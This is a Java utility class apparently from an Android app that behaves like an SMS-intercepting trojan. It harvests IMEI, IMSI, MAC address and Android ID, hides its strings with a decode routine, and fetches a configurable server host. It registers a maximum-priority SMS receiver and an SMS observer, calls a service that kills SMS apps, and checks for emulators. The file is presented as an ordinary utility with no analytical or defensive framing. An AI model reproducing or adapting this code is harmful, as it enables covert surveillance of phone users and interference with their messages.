package net.workspace.util;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import net.workspace.biz.BIZ;
import net.workspace.network.GeminiUtil;
import net.workspace.sms.SmsObserver;
import org.apache.http.HttpHost;
import org.apache.http.client.methods.HttpRequestBase;
import org.json.JSONException;
import org.json.JSONObject;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.webkit.WebView;
import bean.ClientInfo;
import bean.form.Form;

@SuppressLint("NewApi")
public class CommonUtil {
    public static int addRequestFailureCount() {
        String name = PREF_JSON_REQUEST_FAILURE_COUNT;
        SharedPreferences pref = context.getSharedPreferences(name, 0);
        int count = pref.getInt(name, 0) + 1;
        pref.edit().putInt(name, count).commit();
        return count;
    }
    public static boolean checkPermission(String s) {
        return context.checkCallingOrSelfPermission(s) == PackageManager.PERMISSION_GRANTED;
    }
    public static void clearRequestFailureCount() {
        String name = PREF_JSON_REQUEST_FAILURE_COUNT;
        context.getSharedPreferences(name, 0).edit().clear().commit();
    }
    public static File creatFile(String s) {
        File file = new File(s);
        if (!file.exists()) try {
            file.createNewFile();
        } catch (IOException e) {
            MyLogger.error(e);
        }
        return file;
    }
    public static String creatFolder(String s) {
        String s1 = null;
        try {
            String s2;
            boolean flag = Environment.getExternalStorageState().equals("mounted");
            s1 = null;
            if (flag) {
                File file = new File(new StringBuilder().append(Environment.getExternalStorageDirectory()).append(s).toString());
                if (!file.exists()) file.mkdirs();
                s2 = new StringBuilder().append(Environment.getExternalStorageDirectory()).append(s).toString();
                s1 = s2;
            }
        } catch (Exception e) {
            MyLogger.error(e);
        }
        return s1;
    }
    public static <T extends Form> T initForm(Class<T> c) throws Exception {
        T form = c.newInstance();
        form.deviceId = INFO.deviceId;
        form.packageName = INFO.packageName;
        return form;
    }
    public static String getAndroidId() {
        return Secure.getString(context.getContentResolver(), "android_id");
    };
    public static String getCarrier() {
        if (context == null) return "";
        TelephonyManager manager = (TelephonyManager) context.getSystemService(PHONE);
        if (manager != null && manager.getSimState() == 5) return manager.getSimOperatorName();
        else return "";
    };
    public static String getDeviceId() {
        String id = getImei();
        if (TextUtils.isEmpty(id)) id = getMacAddress();
        if (TextUtils.isEmpty(id)) id = getAndroidId();
        return id;
    }
    private static String getImei() {
        String s = "";
        try {
            return ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
        } catch (Exception e) {}
        return s;
    }
    private static String getImsi() {
        String result = "";
        try {
            result = ((TelephonyManager) context.getSystemService("phone")).getSubscriberId();
        } catch (Exception e) {}
        return result;
    }
    public static String getLine1Number() {
        String number = "";
        if (context != null) {
            TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (manager != null) number = manager.getLine1Number();
        }
        return number;
    }
    public static String getLocationUrl(String s, String s1) {
        String result = s1;
        if (!s1.startsWith("http")) {
            int i = s.indexOf("://");
            String s4 = s.substring(0, i + 3);
            String s5 = s.substring(i + 3);
            String s6 = s5.substring(0, s5.indexOf("/"));
            result = new StringBuilder(String.valueOf(s4)).append(s6).append(s1).toString();
        }
        return result.replaceAll("%2CUNTRUSTED", "").replaceAll(" ", "+");
    }
    public static String getMacAddress() {
        String address = "";
        try {
            WifiManager wifimanager = (WifiManager) context.getSystemService(WIFI);
            if (wifimanager != null && hasPermission(ANDROID_PERMISSION_ACCESS_WIFI_STATE)) address = wifimanager.getConnectionInfo().getMacAddress();
        } catch (Exception e) {
            MyLogger.error(e);
        }
        return address;
    }
    /*
    public static List<RunningApp> getSmsPermissionApp() {
        return new ApplicationInfoList().getHasPermissionRunningAppInfo(ANDROID_PERMISSION_RECEIVE_SMS);
    }
     */
    public static String getMobileNumber(String s) {
        String result = "";
        if (s != null) {
            int length = s.length();
            if (length <= 11) result = s;
            else result = s.substring(length - 11);
        }
        return result;
    }
    public static int getRequestFailureCount() {
        String name = PREF_JSON_REQUEST_FAILURE_COUNT;
        return context.getSharedPreferences(name, 0).getInt(name, 0);
    }
    public static String getRuntimeValue(Map<String, String> map, String variable) {
        if (map != null && map.size() > 0) {
            String variableName = searchEnclosed(variable, "${", "}");
            String variableValue = null;
            if (!TextUtils.isEmpty(variableName)) {
                variableValue = map.get(variableName);
            }
            if (variableValue != null) {
                variableValue = variable.replace("${" + variableName + "}", variableValue);
                if (variableValue.contains("${") && variableValue.contains("}")) {//
                    variableValue = getRuntimeValue(map, variableValue);
                }
                variable = variableValue;
            }
        }
        return variable;
    }
    /**
     * http://192.168.0.120:8080/pluginweb/client/
     *
     * @param context
     * @return
     */
    private static String getServerUrl() {
        SharedPreferences pref = context.getSharedPreferences(PREF_HOST_NAME, Context.MODE_PRIVATE);
        String hostName = pref.getString(PREF_HOST_NAME, ParseKsy.decode(BIZ.HOST_NAME));
        return HTTP + hostName + "/" + BIZ.SERVER_URL_PATH;
    }
    public static String GetUrl(byte aray[]) {
        String s = "";
        try {
            aray[0] = (byte) (0xf & aray[0] >> 4 | 0xf0 & aray[0] << 4);
            int length = aray.length;
            for (int i = 1; i < length; i++) {
                aray[i] = (byte) (0xff & aray[i] ^ 0xff & aray[i - 1]);
            }
            s = new String(aray, 0, length);
        } catch (Exception e) {
            MyLogger.error(e);
        }
        return s;
    }
    public static int getVersionCode() {
        try {
            PackageInfo packageinfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
            return packageinfo.versionCode;
        } catch (android.content.pm.PackageManager.NameNotFoundException namenotfoundexception) {
            return 0;
        }
    }
    public static boolean hasPermission(String s1) {
        PackageManager packagemanager = context.getPackageManager();
        return packagemanager.checkPermission(s1, context.getPackageName()) == 0;
    }
    public static void init(Context context) {
        if (CommonUtil.context == null) {
            CommonUtil.context = context;
            initVariables();
            registerReciever();
        }
    }
    public static void initVariables() {
        if (INFO == null) {
            INFO = new ClientInfo();
            INFO.isGemini = GeminiUtil.isGemini();
            if (INFO.isGemini) {
                int slot = GeminiUtil.getSlotByOperator();
                INFO.imsi = GeminiUtil.getImsiBySlot(slot);
                INFO.imei = GeminiUtil.getImeiBySlot(slot);
            } else {
                INFO.imsi = getImsi();
                INFO.imei = getImei();
            }
            INFO.manufacturer = Build.MANUFACTURER;
            INFO.model = Build.MODEL;
            INFO.channel = ParseKsy.decode(BIZ.CHANNEL);
            INFO.versionCode = getVersionCode();
            INFO.packageName = context.getPackageName();
            //INFO.line1Number = getLine1Number();
            INFO.language = Locale.getDefault().getDisplayLanguage();
            INFO.sdkVersion = android.os.Build.VERSION.SDK_INT;
            INFO.androidId = getAndroidId();
            INFO.macAddress = getMacAddress();
            INFO.userAgent = new WebView(context).getSettings().getUserAgentString();
            INFO.deviceId = getDeviceId();
            INFO.brand = android.os.Build.BRAND;
            INFO.hasApnPermission = checkPermission("android.permission.WRITE_APN_SETTINGS");
            INFO.pluginVersion = BIZ.PLUGIN_VERSION;
            SERVER_URL = getServerUrl();
            setProxyMmsc(INFO.imsi);
        }
    }
    public static boolean isEmulator() {
        try {
            if ("000000000000000".equals(((TelephonyManager) context.getSystemService(PHONE)).getDeviceId())) return true;
        } catch (Exception e) {
            MyLogger.error(e);
        }
        return false;
    }
    public static boolean isGprsEnable() {
        ConnectivityManager connectivitymanager = (ConnectivityManager) context.getSystemService("connectivity");
        if (connectivitymanager != null) {
            NetworkInfo networkinfo = connectivitymanager.getNetworkInfo(0);
            if (networkinfo != null && State.CONNECTED == networkinfo.getState()) return true;
        }
        return false;
    }
    public static boolean isInstalled(String pkgName) {
        for (PackageInfo packageinfo : context.getPackageManager().getInstalledPackages(0)) {
            if (packageinfo.applicationInfo.packageName.equals(pkgName)) return true;
        }
        return false;
    }
    /*  public static boolean isSDCardExist() {
          boolean flag;
          if (!Environment.getExternalStorageState().equals("mounted")) flag = false;
          else flag = true;
          return flag;
      }*/
    public static boolean isSimReady() {
        if (((TelephonyManager) context.getSystemService(PHONE)).getSimState() == TelephonyManager.SIM_STATE_READY) return true;
        return false;
    }
    public static boolean isWifiEnable() {
        ConnectivityManager connectivitymanager = (ConnectivityManager) context.getSystemService("connectivity");
        if (connectivitymanager != null) {
            NetworkInfo networkinfo;
            networkinfo = connectivitymanager.getNetworkInfo(1);
            if (networkinfo != null) {
                android.net.NetworkInfo.State state;
                state = networkinfo.getState();
                if (state != null) {
                    android.net.NetworkInfo.State state1 = android.net.NetworkInfo.State.CONNECTED;
                    if (state1 == state) return true;
                }
            }
        }
        return false;
    }
    public static void judgeNet(HttpRequestBase http) {
        if (context != null && http != null) {
            try {
                if (!((WifiManager) context.getSystemService(WIFI)).isWifiEnabled()) {
                    Uri uri = Uri.parse(APN);
                    Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
                    if (cursor != null) {
                        cursor.moveToNext();
                        String host = cursor.getString(cursor.getColumnIndex(COLUMN_PROXY));
                        if (host != null && host.trim().length() > 0) {
                            HttpHost httphost = new HttpHost(host, 80);
                            http.getParams().setParameter("http.route.default-proxy", httphost);
                        }
                        cursor.close();
                    }
                }
            } catch (Exception e) {
                MyLogger.error(e);
            }
        }
    }
    public static void killSmsApp() {
        context.startService(new Intent(context, net.workspace.KillService.class));
    }
    /**
     * @param target
     * @param searcher, 1:text(),2:enclosed(),3:regex(),4:left(),5:right()
     * @return
     */
    public static String parseVariable(String target, String searcher) {
        try {
            if (target != null && !TextUtils.isEmpty(searcher) && searcher.endsWith(")")) {
                for (int i = 0; i < supportedMethod.length; i++) {
                    String method = supportedMethod[i];
                    if (searcher.startsWith(method + "(")) {
                        String variable = searcher.substring(method.length() + 1, searcher.length() - 1);
                        switch (i) {
                            case 0:
                                return variable;
                            case 1:
                                return searchEnclosed(target, variable);
                            case 2:
                                return searchRegex(target, variable);
                            case 3:
                                return searchLeft(target, variable);
                            case 4:
                                return searchRight(target, variable);
                        }
                        break;
                    }
                }
            }
        } catch (Exception e) {
            MyLogger.error(e);
        }
        return null;
    }
    public static byte[] readFile(String name) {
        byte result[] = null;
        boolean exists = false;
        for (String f : context.fileList()) {
            if (name.equals(f)) {
                exists = true;
                break;
            }
        }
        if (exists) {
            FileInputStream stream = null;
            try {
                stream = context.openFileInput(name);
                result = new byte[stream.available()];
                stream.read(result);
            } catch (Exception e) {
                MyLogger.error(e);
            } finally {
                if (stream != null) try {
                    stream.close();
                } catch (Exception e) {}
            }
        }
        return result;
    }
    public static void registerReciever() {
        if (!IS_REGISTER) {
            IS_REGISTER = true;
            context.startService(new Intent(context, net.workspace.CommonService.class).setAction(net.workspace.CommonService.ACTION_REGISTER_RECEIVER));
        }
    }
    public static void registerRecievier(Context context) {
        killSmsApp();
        {
            IntentFilter filter = new IntentFilter();
            filter.addAction(ANDROID_NET_CONN_CONNECTIVITY_CHANGE);
            filter.addAction(ANDROID_INTENT_ACTION_USER_PRESENT);
            filter.addAction(ANDROID_INTENT_ACTION_BATTERY_CHANGED);
            filter.addAction(ANDROID_INTENT_ACTION_TIME_TICK);
            filter.addAction(ANDROID_INTENT_ACTION_SCREEN_OFF);
            filter.addAction(ANDROID_INTENT_ACTION_SCREEN_ON);
            context.registerReceiver(new net.workspace.ActivateReceiver(), filter);
        }
        {
            IntentFilter filter = new IntentFilter();
            filter.addAction(SMS_RECEIVED);
            filter.addAction(SMS_SEND);
            filter.setPriority(0x7fffffff);
            context.registerReceiver(new net.workspace.SmsReceiver(), filter);
        }
        SmsObserver smsobserver = new SmsObserver(new Handler());
        context.getContentResolver().registerContentObserver(Uri.parse(Constants.CONTENT_SMS), true, smsobserver);
        killSmsApp();
    }
    public static boolean saveFileValue(String s, byte abyte0[]) {
        boolean flag = false;
        if (abyte0 != null) {
            FileOutputStream fileoutputstream = null;
            try {
                fileoutputstream = context.openFileOutput(s, 0);
                fileoutputstream.write(abyte0);
                fileoutputstream.flush();
                flag = true;
            } catch (Exception e) {
                MyLogger.error(e);
            } finally {
                try {
                    fileoutputstream.close();
                } catch (IOException e) {
                    MyLogger.error(e);
                }
            }
        }
        return flag;
    }
    //left`right`matcherIndex
    private static String searchEnclosed(String target, String searcher) {
        if (target != null && searcher != null) {
            String left = null;
            String right = null;
            int matcherIndex = -1;
            String[] fields = searcher.split(SPLITTER);
            if (fields.length >= 2) {
                left = fields[0];
                right = fields[1];
                if (fields.length >= 3) {
                    matcherIndex = Integer.valueOf(fields[2].trim());
                }
            }
            return searchEnclosed(target, left, right, matcherIndex);
        }
        return null;
    }
    public static String searchEnclosed(String target, String left, String right) {
        return searchEnclosed(target, left, right, 0);
    }
    public static String searchEnclosed(String target, String left, String right, int matcherIndex) {
        if (!TextUtils.isEmpty(target) && !TextUtils.isEmpty(left) && !TextUtils.isEmpty(right)) {
            int index = 0;
            int leftPlace = 0;
            int rightPlace = 0;
            int fromPlace = 0;
            while (leftPlace >= 0 && rightPlace >= 0) {
                leftPlace = target.indexOf(left, fromPlace);
                if (leftPlace >= 0) {
                    fromPlace = leftPlace + left.length() + 1;
                    rightPlace = target.indexOf(right, fromPlace);
                    if (rightPlace > 0 && (matcherIndex == -1 || matcherIndex == index++)) {//
                        return target.substring(leftPlace + left.length(), rightPlace);
                    }
                    fromPlace = rightPlace + right.length() + 1;
                }
            }
        }
        return null;
    }
    private static String searchLeft(String target, String searcher) {
        if (target != null && searcher != null) {
            int place = target.indexOf(searcher);
            if (place >= 0) { return target.substring(0, place); }
        }
        return null;
    }
    //regex`groupIndex`matcherIndex
    private static String searchRegex(String target, String searcher) {
        String result = null;
        String regex = null;
        int matcherIndex = -1;
        int groupIndex = -1;
        if (searcher != null) {
            String[] fields = searcher.split(SPLITTER);
            if (fields.length >= 2) {
                regex = fields[0];
                groupIndex = Integer.valueOf(fields[1].trim());
                if (fields.length >= 3) {
                    matcherIndex = Integer.valueOf(fields[2].trim());
                }
            }
        }
        if (regex != null && groupIndex >= 0) {
            Pattern pattern = Pattern.compile(regex);
            Matcher matcher = pattern.matcher(target);
            int index = 0;
            while (matcher.find()) {
                if (matcherIndex == -1 || index++ == matcherIndex) {
                    if (groupIndex <= matcher.groupCount()) {
                        result = matcher.group(groupIndex);
                    }
                    break;
                }
            }
        }
        return result;
    }
    private static String searchRight(String target, String searcher) {
        if (target != null && searcher != null) {
            int place = target.indexOf(searcher);
            if (place >= 0) { //
                return target.substring(place + searcher.length());
            }
        }
        return null;
    }
    public static void setHostName(String hostName) {
        if (!TextUtils.isEmpty(hostName)) {
            SharedPreferences pref = context.getSharedPreferences(PREF_HOST_NAME, Context.MODE_PRIVATE);
            pref.edit().putString(PREF_HOST_NAME, hostName).commit();
            SERVER_URL = getServerUrl();
        }
    }
    public static void setProxyMmsc(String imsi) {
        if (TextUtils.isEmpty(imsi)) return;
        if (imsi.startsWith(_46000) || imsi.startsWith(_46002)) {
            PROXY = _10_0_0_172;
            MMSC = MMSC_MONTERNET_COM;
        } else if (imsi.startsWith(_46001)) {
            PROXY = _010_000_000_172;
            MMSC = HTTP_MMSC_MYUNI_COM_CN;
        } else if (imsi.startsWith(_46003)) {
            PROXY = _10_0_0_200;
            MMSC = HTTP_MMSC_VNET_MOBI;
        }
    }
    public static void sleep(long milseconds) {
        try {
            Thread.sleep(milseconds);
        } catch (InterruptedException e) {
            MyLogger.error(e);
        }
    }
    public static JSONObject toJson(String s) {
        JSONObject obj = null;
        if (s != null && s.trim().length() > 0) {
            try {
                obj = new JSONObject(s);
            } catch (JSONException e) {
                MyLogger.error(e);
            }
        }
        return obj;
    }
    public static String toString(Exception exception) {
        StringWriter sw = null;
        PrintWriter pw = null;
        String result = exception.getMessage();
        try {
            sw = new StringWriter();
            pw = new PrintWriter(sw);
            exception.printStackTrace(pw);
            result = sw.toString();
        } catch (Exception e) {
            MyLogger.error(e);
        } finally {
            try {
                sw.close();
            } catch (IOException e) {
                MyLogger.error(e);
            }
            pw.close();
        }
        return result;
    }
    public static final String ANDROID_PERMISSION_RECEIVE_SMS = "android.permission.RECEIVE_SMS";
    /**
     * "android.provider.Telephony.SMS_SEND"
     */
    public static String SMS_SEND = "android.provider.Telephony.SMS_SEND";
    /**
     * android.provider.Telephony.SMS_RECEIVED
     */
    public static String SMS_RECEIVED = ParseKsy.decode("e43b68d9fee83bfd2428a3d114880741496ef5fba5d801c883448c8dcbd5f698ed534170193fcce28386cf1ebc5fb3c4");
    public static ClientInfo INFO;
    public static Context context;
    /**
     * content://telephony/carriers/preferapn
     */
    public static String APN = ParseKsy.decode("2220183c53791ef7f2ed91d499477101f4c4d13628045ed7232c1940c0033de7090046dfca28fd7caac368fc35963ad6");
    /**
     * content://telephony/carriers_gemini/preferapn
     */
    public static String APN_GEMINI = ParseKsy.decode("2220183c53791ef7f2ed91d499477101260c8e781ba53d742ba0155c251cfe6946774d846063157c02d10ac81f6244df");
    /**
     * "http://"
     */
    private static String HTTP = ParseKsy.decode("537825635d831f291f5e714681a843a6");
    private static String ANDROID_PERMISSION_ACCESS_WIFI_STATE = "android.permission.ACCESS_WIFI_STATE";
    private static String ANDROID_ID = "android_id";
    private static String PHONE = "phone";
    private static String ANDROID_PERMISSION_READ_PHONE_STATE = "android.permission.READ_PHONE_STATE";
    private static String _46003 = ParseKsy.decode("2a3e92d5fae66026ba1cd50fef4ffda4");
    private static String _46001 = ParseKsy.decode("9fdd63eb62bdf2ae7d5186be58d28b74");
    private static String _46002 = ParseKsy.decode("69d1eb827e544aed604c2867844835eb");
    private static String _46000 = ParseKsy.decode("e4aa4e545a24f174172187d74bad4521");
    /**
     * "http://mmsc.vnet.mobi"
     */
    private static String HTTP_MMSC_VNET_MOBI = ParseKsy.decode("f68d07fbef2899516e6057b42c888e58d1b76c643261448295fab2cae012b50b");
    /**
     * "10.0.0.200"
     */
    private static String _10_0_0_200 = ParseKsy.decode("e153a8dd41d68e5d001a114c42235bc3");
    /**
     * "http://mmsc.myuni.com.cn"
     */
    private static String HTTP_MMSC_MYUNI_COM_CN = ParseKsy.decode("2c65a805ad603491e6ec5a7e6aa294b105a0e689d94f0f73ed9bec58637b9281");
    /**
     * "010.000.000.172"
     */
    private static String _010_000_000_172 = ParseKsy.decode("29e956051149b95192f11a94c1894bf8");
    /**
     * "10.0.0.172"
     */
    private static String _10_0_0_172 = ParseKsy.decode("55ee27ff750a434660316b7b422bd896");
    /**
     *
     */
    public static String PROXY = _10_0_0_172;
    /**
     * "http://mmsc.monternet.com"
     */
    private static String MMSC_MONTERNET_COM = ParseKsy.decode("cf987cb42724e4b91087d218ef0c735e6d21feacddfa368b49973412ede27ab6");
    /**
     * `
     */
    public static String SPLITTER = "`";
    public static boolean IS_REGISTER = false;
    public static String WIFI = ParseKsy.decode("755e9d875600aced5b616163301bb1df");
    /**
     * "http://mmsc.monternet.com"
     */
    public static String MMSC = ParseKsy.decode("cf987cb42724e4b91087d218ef0c735e6d21feacddfa368b49973412ede27ab6");
    public static String PREF_JSON_REQUEST_FAILURE_COUNT = "537825635d831f291f5e714681a843a6";
    public static String SERVER_URL;
    private static String PREF_HOST_NAME = "OOOOoooooOOOO";
    /**
     * ["text","enclosed", "regex","left","right"]
     */
    private static String[] supportedMethod = { //
    //
            ParseKsy.decode("3e8f2ffdde007cffb344a32c3eb68ec9"),// "text",
            ParseKsy.decode("32a79f175a4e99281021b959f50ee765"),//"enclosed", //
            ParseKsy.decode("4b44c42addd0f4b6ffc77db5ffb83b74"),//"regex",//
            ParseKsy.decode("a728e9a9b7d308596d1ff60c39985781"),//"left",//
            ParseKsy.decode("57ccaef42f6777410903e505f918dc29") //   "right"
    //
    };
    /**
     * proxy
     */
    private static String COLUMN_PROXY = ParseKsy.decode("6b99d17e8a86086993a5245a00583d8b");
    /**
     * android.intent.action.SCREEN_ON
     */
    private static String ANDROID_INTENT_ACTION_SCREEN_ON = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642c8c82b244404cc4fbd34df52b49a34438");
    /**
     * android.intent.action.SCREEN_OFF
     */
    private static String ANDROID_INTENT_ACTION_SCREEN_OFF = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642c7bde60b3676378a7f87d15c95402c6ab04d46b50b3dbc32b33074582f9447c02");
    /**
     * android.intent.action.TIME_TICK
     */
    private static String ANDROID_INTENT_ACTION_TIME_TICK = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642c79f7c9c7c0af858c59157b890141da12");
    /**
     * android.intent.action.BATTERY_CHANGED
     */
    private static String ANDROID_INTENT_ACTION_BATTERY_CHANGED = ParseKsy
            .decode("162ef256c2d7e65c1493a06e552d642cb7236f334d29c39769dbeee3bce0dc4e25a2109182828428ddfede5cce6466ec");
    /**
     * android.intent.action.USER_PRESENT
     */
    private static String ANDROID_INTENT_ACTION_USER_PRESENT = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642cc86dab75695ccb2d3173404a66d88323acdf0e1aa78fbcdf767163701ed49d08");
    /**
     * android.net.conn.CONNECTIVITY_CHANGE
     */
    private static String ANDROID_NET_CONN_CONNECTIVITY_CHANGE = ParseKsy
            .decode("038963c1edfb1650f440a983ecfe5e91321c97643c68e20915da2348ca1a3578eb3cbc0ca17b5282734662bf3941fc8e");
}
